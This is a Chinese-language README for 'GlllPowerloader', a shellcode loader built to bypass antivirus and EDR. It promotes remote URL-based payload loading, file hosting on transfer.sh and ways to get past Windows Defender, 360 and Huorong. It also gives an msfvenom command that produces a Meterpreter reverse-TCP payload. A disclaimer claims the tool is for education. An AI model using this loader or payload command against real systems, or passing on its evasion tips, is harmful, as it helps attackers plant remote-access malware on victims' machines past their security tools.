# GlllPowerloader

- [GlllPowerloader](#glllpowerloader)
- [1.前言](#1前言)
- [2.功能](#2功能)
- [3.使用](#3使用)
  - [0x01.环境安装](#0x01环境安装)
  - [0x02.使用方法](#0x02使用方法)
  - [0x03.视频演示](#0x03视频演示)
- [4.更新](#4更新)
- [5.免责声明](#5免责声明)
- [6.致谢](#6致谢)



# 1.前言

* 视频讲解：https://www.bilibili.com/video/BV1RK411z7XA/  欢迎点赞关注

- 刚开始可以免杀主流杀软的，不过后面肯定会被乱杀，开源的目的是学习恶意代码和自动化脚本
- 本人并不推荐shellcode加密，一般的加密算法都会使程序熵增，可以使用远程加载和图片隐写的方式分离shellcode

# 2.功能



|       功能       |                描述                |
| :--------------: | :--------------------------------: |
|   1.免杀加载器   | 各种方式加载shellcode，绕过AV/EDR  |
|  2.文件格式转换  |    Windows中文件格式之间的转换     |
| 3.自动化文件托管 | 将文件托管到：https://transfer.sh/ |



# 3.使用

## 0x01.环境安装

您必须下载并安装以下环境：

1.Mingw64(C/C++)：https://github.com/niXman/mingw-builds-binaries/releases/download/12.2.0-rt_v10-rev2/x86_64-12.2.0-release-posix-seh-msvcrt-rt_v10-rev2.7z

解压完以后，将bin目录添加至环境变 量即可

使用Git下载项目

```
git clone https://github.com/INotGreen/GlllPowerloader.git
cd GlllPowerLoader-master
pip install -r requirements.txt
start.bat
```



## 0x02.使用方法

- 大部分已经不能免杀了，不过稍微改一下还是能过主流AV
- 必须保证你的shellcode是干净的，否则还是会被Windows Defender抓住，您可以学习[Reflective DLL Injection](https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html)和[sRDI](https://github.com/monoxgas/sRDI/tree/master)来自定义shellcode
- 如果你在使用的过程中被defender查杀了，有可能是您使用的C2工具shellcode内存被抓住了，而不一定是加载器的问题
- 加载方式采用URL分离加载，所以你需要将shellcode（bin文件）上传或者托管至网站，并且记下URL


Metasploit:

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f raw -o payload.bin
```



## 0x03.视频演示



![示例GIF](https://github.com/INotGreen/GlllPowerloader/blob/main/Image/demo.gif)

# 4.更新

[+] 2022年12.21，Powerloader发布

[+]2023 年11.15， 删除冗余的功能，优化代码，（之前的版本涉及语言安装环境太多了，使用太麻烦，为了简便就留C/C++的加载器）

[+]2023年11.20，免杀defender，360，火绒（前提是shellcode内存是没有被标记的）

免杀加载器正在更新中。。。


# 5.免责声明

该工具仅用于网络安全教育和研究，禁止用于非法途径，我对您由使用或传播等由此软件引起的任何行为和/或损害不承担任何责任。您对使用此软件的任何行为承担全部责任，并承认此软件仅用于教育和研究目的。下载本软件或软件的源代码，您自动同意上述内容。

# 6.致谢

https://github.com/icyguider/Shhhloader
